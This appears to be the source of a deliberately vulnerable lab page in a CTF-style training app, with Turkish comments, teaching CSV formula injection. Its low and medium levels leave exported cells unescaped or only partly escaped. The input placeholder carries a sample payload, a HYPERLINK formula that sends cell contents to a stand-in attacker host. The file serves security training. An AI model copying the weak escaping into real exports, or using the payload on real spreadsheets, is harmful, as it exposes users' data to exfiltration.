// CSV / FORMULA INJECTION HEDEF MAKINESI
// GET /csv-injection            -> isim listesi + CSV önizleme
// GET /csv-injection?export=1   -> CSV indir (text/csv)
// POST /csv-injection           -> yeni isim ekle (hücre formül olarak yorumlanabilir)
import { getLevel } from "@/lib/level";
import { FLAGS } from "@/lib/flags";
import { page, flagBanner, esc, html } from "@/lib/machine-ui";

export const dynamic = "force-dynamic";
const FLAG = FLAGS["csv-injection"];

let names = ["Ahmet Yılmaz", "Ayşe Demir"];
const DANGEROUS = /^[=+\-@\t\r]/;

function escapeCell(v, level) {
  if (level === "high") return DANGEROUS.test(v) ? "'" + v : v;       // tüm tehlikeli ön ekler nötrlenir
  if (level === "medium") return v.replace(/^=/, "");                  // yalnızca '=' nötrlenir
  return v;                                                            // low: ham
}

function buildCsv(level) {
  const rows = [["id", "name"], ...names.map((n, i) => [String(i + 1), escapeCell(n, level)])];
  return rows.map((r) => r.map((c) => `"${String(c).replace(/"/g, '""')}"`).join(",")).join("\n");
}

function render(level, msg = null) {
  const injected = names.some((n) => DANGEROUS.test(escapeCell(n, level))); // kaçış sonrası hâlâ formül mü?
  const body = `
    ${injected ? flagBanner({ value: FLAG, sub: "CSV çıktısında formül kaçırılmadı — Excel'de çalışır (formula injection)." }) : ""}
    <div class="panel"><div class="panel-b col" style="display:flex;flex-direction:column;gap:14px">
      <h2 style="margin:0;font-size:19px">👥 Kullanıcı Listesi (Admin Export)</h2>
      <p class="sub" style="margin:0">İsmini ekle; admin listeyi CSV olarak dışa aktarır. <b>Hedef:</b> hücreye formül enjekte et (<code>=</code>,<code>+</code>,<code>-</code>,<code>@</code> ile başlat).</p>
      ${msg ? `<div class="note">${esc(msg)}</div>` : ""}
      <form method="post" action="/csv-injection" style="display:flex;gap:8px">
        <input name="name" placeholder='=HYPERLINK("http://atk/?d="&A1)' style="flex:1" required>
        <button class="btn primary" type="submit">Ekle</button>
      </form>
      <div><div class="faint mono" style="font-size:11px;margin-bottom:6px">KAYITLAR</div>
        ${names.map((n) => `<div class="note" style="margin-bottom:6px">${esc(n)}</div>`).join("")}</div>
      <div class="faint mono" style="font-size:11px">CSV ÖNİZLEME (level=${esc(level)})</div>
      <div class="console">${esc(buildCsv(level))}</div>
      <div style="display:flex;gap:8px">
        <a class="btn" href="/csv-injection?export=1">CSV indir</a>
        <button class="btn" onclick="fetch('/csv-injection?reset=1',{method:'POST'}).then(()=>location.href='/csv-injection')">Sıfırla</button>
      </div>
    </div></div>`;
  return page({ title: "ördek // CSV Export", level, subtitle: "csv-export", body });
}

export async function GET(req) {
  const level = getLevel(req.headers);
  const url = new URL(req.url);
  if (url.searchParams.get("export")) {
    return new Response(buildCsv(level), { status: 200, headers: { "content-type": "text/csv; charset=utf-8", "content-disposition": "attachment; filename=users.csv" } });
  }
  return html(render(level));
}

export async function POST(req) {
  const level = getLevel(req.headers);
  const url = new URL(req.url);
  if (url.searchParams.get("reset")) { names = ["Ahmet Yılmaz", "Ayşe Demir"]; return html(render(level, "Sıfırlandı.")); }

  let name = "";
  try { const f = await req.formData(); name = String(f.get("name") || ""); } catch {}
  if (!name) return html(render(level, "İsim gerekli."), 400);
  names.push(name);
  return html(render(level, "Eklendi. CSV önizlemesini ve indirme çıktısını kontrol et."));
}
